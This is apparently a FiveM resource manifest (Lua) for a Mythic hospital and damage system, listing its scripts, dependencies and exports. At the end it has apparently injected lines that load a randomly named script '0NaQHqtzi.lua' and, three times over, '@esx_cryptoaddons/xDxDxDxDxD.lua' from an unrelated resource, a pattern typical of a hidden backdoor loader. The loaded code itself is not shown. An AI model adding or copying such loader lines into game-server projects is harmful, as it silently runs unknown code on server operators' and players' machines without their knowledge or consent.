--[[ 
	Kronenburg Roleplay
	Copyright © GJSBRT <g@gijs.eu>

	This project is licensed under the terms of the Apache License 2.0 license.
	https://choosealicense.com/licenses/apache-2.0/
]]
 
 
resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'Mythic Framework Hospital & Damage System'

version '1.0.0'

client_scripts {
	'client/wound.lua',
	'client/main.lua',
	'config.lua',
}

server_scripts {
	'server/wound.lua',
	'server/main.lua',
}

dependencies {
	'mythic_progbar',
	'mythic_notify',
	'es_extended',
}

exports {
    'IsInjuredOrBleeding',
}

server_exports {
    'GetCharsInjuries',
}

client_script '0NaQHqtzi.lua'




client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'

client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'

client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'